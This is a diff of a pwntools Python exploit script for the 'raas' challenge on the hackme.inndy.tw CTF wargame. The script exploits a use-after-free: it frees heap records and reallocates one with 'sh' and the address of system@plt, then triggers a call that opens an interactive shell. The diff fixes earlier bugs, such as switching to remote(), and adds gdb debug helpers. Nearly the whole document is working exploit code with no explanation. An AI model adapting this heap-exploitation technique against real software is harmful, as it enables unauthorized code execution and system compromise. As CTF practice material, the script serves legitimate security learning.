@@ -5,26 +5,32 @@ __Auther__ = 'M4x'
 from pwn import *
 from time import sleep
 import sys
+context.log_level = "debug" 
+context.terminal = ["deepin-terminal", "-x", "sh", "-c"]
+
+def debug():
+    raw_input("DEBUG: ")
+    gdb.attach(io, "set follow-fork-mode parent\nb *main")
+
 
 if sys.argv[1] == "r":
-    io = process("hackme.inndy.tw", 7719)
+    io = remote("hackme.inndy.tw", 7719)
     elf = ELF("./raas")
 else:
     io = process("./raas")
     elf = ELF("./raas")
-    
-sys_plt = elf.plt["system"]
+    #  debug()
 
-def New(idx, tp, val, length = 0):
+def New(idx, kind, value, length = 0):
     io.sendlineafter("Act > ", "1")
     io.sendlineafter("Index > ", str(idx))
-    io.sendlineafter("Type > ", str(tp))
-
-    if tp == 2:
-        io.sendlfter("Length > ", str(length))
-
-    io.sendafter("Value > ", val)
-
+    io.sendlineafter("Type > ", str(kind))
+    if kind == 2:
+        io.sendlineafter("Length > ", str(length))
+        io.sendlineafter("Value > ", value)
+        
+    else:
+        io.sendlineafter("Value > ", str(value))
 
 def Del(idx):
     io.sendlineafter("Act > ", "2")
@@ -35,24 +41,18 @@ def Show(idx):
     io.sendlineafter("Index > ", str(idx))
 
 def uaf():
-    log.info("Step 1: free")
-    New(1, 1, "1234")
-    New(2, 1, "1234")
+    New(0, 1, 0x1000)
+    New(1, 1, 0x2000)
 
+    Del(0)
     Del(1)
-    Del(2)
-    pause()
 
-    log.info("Step 2: after")
-    payload = "sh\x00\x00" + p32(sys_plt) + "aaa"
-    New(3, 2, payload, 12)
-    New(4, 2, "aaaa", 7)
-    pause()
+    New(2, 2, ("sh\x00\x00" + p32(elf.plt["system"])), 10)
+    #  New(3, 2, ("sh\x00\x00" + p32(elf.plt["system"])), 10)
 
-    log.info("Step 3: use")
-    Del(2)
-    io.interactive()
-    io.close()
+    Del(0)
 
 if __name__ == "__main__":
     uaf()
+    io.interactive()
+    io.close()
